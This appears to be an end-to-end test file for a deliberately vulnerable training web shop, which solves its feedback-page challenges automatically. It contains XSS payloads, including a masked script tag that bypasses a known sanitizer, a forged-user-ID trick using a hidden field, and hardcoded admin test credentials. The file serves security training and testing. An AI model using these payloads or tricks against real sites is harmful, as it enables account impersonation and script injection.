'use strict';

describe('/#/contact', function () {

    var comment, rating, submitButton;

    protractor.beforeEach.login({email: 'admin@juice-sh.op', password: 'admin123'});

    beforeEach(function () {
        browser.get('/#/contact');
        comment = element(by.model('feedback.comment'));
        rating = element(by.model('feedback.rating'));
        submitButton = element(by.id('submitButton'));
    });

    describe('challenge "forgedFeedback"', function () {

        it('should be possible to provide feedback as another user', function () {
            browser.executeScript('document.getElementById("userId").removeAttribute("ng-hide");');
            browser.executeScript('document.getElementById("userId").removeAttribute("class");');

            var UserId = element(by.model('feedback.UserId'));
            UserId.clear();
            UserId.sendKeys('2');
            comment.sendKeys('Picard stinks!');
            rating.click();

            submitButton.click();

            browser.get('/#/administration');
            var feedbackUserId = element.all(by.repeater('feedback in feedbacks').column('UserId'));
            expect(feedbackUserId.last().getText()).toMatch('2');
        });

        protractor.expect.challengeSolved({challenge: 'forgedFeedback'});

    });

    it('should sanitize script from comments to remove potentially malicious html', function () {
        comment.sendKeys('Sani<script>alert("ScriptXSS")</script>tizedScript');
        rating.click();

        submitButton.click();

        expectPersistedCommentToMatch(/SanitizedScript/);
    });

    it('should sanitize image from comments to remove potentially malicious html', function () {
        comment.sendKeys('Sani<img src="alert("ImageXSS")"/>tizedImage');
        rating.click();

        submitButton.click();

        expectPersistedCommentToMatch(/SanitizedImage/);
    });

    it('should sanitize iframe from comments to remove potentially malicious html', function () {
        comment.sendKeys('Sani<iframe src="alert("IFrameXSS")"></iframe>tizedIFrame');
        rating.click();

        submitButton.click();

        expectPersistedCommentToMatch(/SanitizedIFrame/);
    });

    describe('challenge "xss3"', function () {

        it('should be possible to trick the sanitization with a masked XSS attack', function () {
            var EC = protractor.ExpectedConditions;

            comment.sendKeys('<<script>Foo</script>script>alert("XSS3")<</script>/script>');
            rating.click();

            submitButton.click();

            browser.get('/#/about');
            browser.wait(EC.alertIsPresent(), 5000, "'XSS3' alert is not present");
            browser.switchTo().alert().then(function (alert) {
                expect(alert.getText()).toEqual('XSS3');
                alert.accept();
            });

            browser.get('/#/administration');
            browser.wait(EC.alertIsPresent(), 5000, "'XSS3' alert is not present");
            browser.switchTo().alert().then(function (alert) {
                expect(alert.getText()).toEqual('XSS3');
                alert.accept();
                element.all(by.repeater('feedback in feedbacks')).last().element(by.css('.fa-trash')).click();
            });

        });

        protractor.expect.challengeSolved({challenge: 'xss3'});

    });

    describe('challenge "vulnerableComponent"', function () {

        it('should be possible to post known vulnerable component(s) as feedback', function () {
            comment.sendKeys('sanitize-html 1.4.2 is vulnerable to masking attacks because it does not act recursively.');
            comment.sendKeys('sequelize 1.7.11 is vulnerable to SQL Injection via GeoJSON.');
            rating.click();

            submitButton.click();
        });

        protractor.expect.challengeSolved({challenge: 'vulnerableComponent'});

    });

    describe('challenge "weirdCrypto"', function () {

        it('should be possible to post weird crypto algorithm/library as feedback', function () {
            comment.sendKeys('The following libraries should really not be used for crypto: z85, base85 and rot13');
            rating.click();

            submitButton.click();
        });

        protractor.expect.challengeSolved({challenge: 'weirdCrypto'});

    });

});

function expectPersistedCommentToMatch(expectation) {
    browser.get('/#/administration');
    var feedbackComments = element.all(by.repeater('feedback in feedbacks').column('comment'));
    expect(feedbackComments.last().getText()).toMatch(expectation);
}